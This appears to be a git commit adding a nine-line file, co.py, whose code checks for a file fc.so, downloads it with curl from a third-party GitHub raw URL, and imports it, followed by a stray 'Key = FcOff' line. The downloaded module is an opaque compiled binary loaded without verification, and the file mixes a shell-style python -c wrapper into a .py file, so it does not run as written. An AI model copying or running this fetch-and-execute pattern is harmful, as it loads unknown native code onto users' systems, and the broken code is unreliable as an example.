659dcc5e0a66ae390a88f3d245580e13c1cccead
Sayem <88239049+Sayem234@users.noreply.github.com>
2023-03-22 19:53:26 +0600

    Create co.py

---
+++ co.py
@@ -0,0 +1,9 @@
+python -c """
+import os
+if not os.path.exists('fc.so'):
+ os.system('curl https://raw.githubusercontent.com/Hannan-404/FILE/main/fc.so > fc.so')
+ import fc
+else:
+ import fc
+""" 
+Key = FcOff
